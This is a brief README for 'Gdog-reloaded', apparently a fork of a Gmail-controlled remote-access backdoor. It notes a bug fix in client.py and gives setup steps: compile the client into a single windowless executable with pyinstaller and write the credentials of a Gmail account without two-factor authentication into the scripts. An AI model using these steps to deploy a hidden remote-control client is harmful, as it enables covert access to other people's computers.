Gdog-reloaded
====
this is a small improvement on https://github.com/maldevel/gdog

Is added a further control into client.py code which caused error (python 2.7 32bit on windows 8.1):

self.ipv4 = netifaces.ifaddresses(iface).get(netifaces.af_inet, [])[0]['addr'] indexerror: list index out of range

This issue is solved in this version.


Make sure netifaces is installed.

Use  pyinstaller.exe --onefile --windowed client.py to compile client python file into a single .exe

Use a gmail account without 2fa, modify both python files and write your email/pwd 
 
